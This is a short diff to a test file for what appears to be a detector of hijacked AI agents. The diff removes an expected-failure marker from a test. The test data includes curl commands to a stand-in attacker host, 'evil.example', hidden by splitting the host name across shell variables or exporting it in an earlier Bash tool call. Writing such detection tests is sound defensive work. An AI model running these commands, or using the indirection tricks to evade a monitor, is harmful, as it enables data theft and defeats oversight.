@@ -53,7 +53,6 @@ def test_string_concatenation_is_caught():
     assert _verdict('H="ev"; D="il.example"; curl http://$H$D/x').verdict is VerdictKind.HIJACKED
 
 
-@pytest.mark.xfail(reason="cross-call env-var indirection not tracked (M9 remaining)", strict=False)
 def test_cross_call_env_var_indirection_is_caught():
     setenv = ToolCall(T + timedelta(seconds=2), "s1", "Bash", {"command": "export H=evil.example"}, CWD)
     v = _verdict("curl http://$H/x", extra_events=(setenv,))
